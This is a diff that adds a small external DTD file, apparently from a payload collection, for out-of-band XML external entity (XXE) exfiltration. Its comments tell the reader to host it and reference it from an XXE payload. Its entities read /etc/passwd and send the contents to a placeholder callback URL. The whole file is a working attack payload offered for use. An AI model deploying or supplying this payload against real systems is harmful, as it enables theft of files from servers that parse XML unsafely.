@@ -1,0 +1,8 @@
+<!-- External DTD for OOB XXE data exfiltration -->
+<!-- Host this on your server and reference in XXE payload -->
+
+<!-- Basic exfiltration -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://CALLBACK_URL/?data=%file;'>">
+%eval;
+%exfil;
